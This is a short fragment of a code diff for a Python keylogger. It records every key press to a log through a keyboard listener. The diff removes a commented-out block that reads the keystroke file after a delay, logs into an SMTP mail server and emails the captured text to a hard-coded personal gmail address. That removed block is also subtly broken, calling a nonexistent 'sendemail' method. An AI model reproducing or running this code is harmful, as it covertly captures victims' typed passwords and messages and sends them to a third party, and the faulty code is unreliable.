@@ -23,12 +23,3 @@ def on_press(key):
             logging.info(str(key))
 with Listener(on_press=on_press) as listener:
             listener.join()
-'''
-sleep(600)
-with open("keyLog.txt",'r') as f:
-    dat=f.read()
-server=SMTP('smtp.gmail.com',587)
-server.login(target,targetpass)
-server.sendemail(targetmail,"shakthivelvenkatesan@gmail.com",dat)
-server.quit()
-'''
